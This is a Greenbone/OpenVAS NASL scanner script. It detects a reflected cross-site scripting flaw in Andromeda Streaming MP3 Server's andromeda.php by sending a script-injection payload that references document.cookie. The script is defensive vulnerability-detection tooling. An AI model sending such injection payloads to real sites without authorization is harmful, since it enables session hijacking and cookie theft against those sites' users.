if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802777" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-05-14 13:55:03 +0530 (Mon, 14 May 2012)" );
	script_name( "Andromeda Streaming MP3 Server Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/18359" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/75497" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/112549/ZSL-2012-5087.txt" );
	script_xref( name: "URL", value: "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5087.php" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site." );
	script_tag( name: "affected", value: "Andromeda Streaming MP3 Server version 1.9.3.6 PHP (2012) and
  prior" );
	script_tag( name: "insight", value: "The flaw is due to an improper validation of user supplied
  input passed via 's' parameter to the 'andromeda.php' script, which allows
  attackers to execute arbitrary HTML and script code in the context of an
  affected application or site." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Andromeda Streaming MP3 Server is prone to
  cross site scripting vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/music", "/andromeda", "/mp3", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/andromeda.php";
	if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<title>andromeda|powered by Andromeda", extra_check: "Andromeda:" )){
		url = url + "?q=s&s=\"><script>alert(document.cookie);</script>";
		if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "><script>alert\\(document.cookie\\);</script>", extra_check: "powered by Andromeda" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

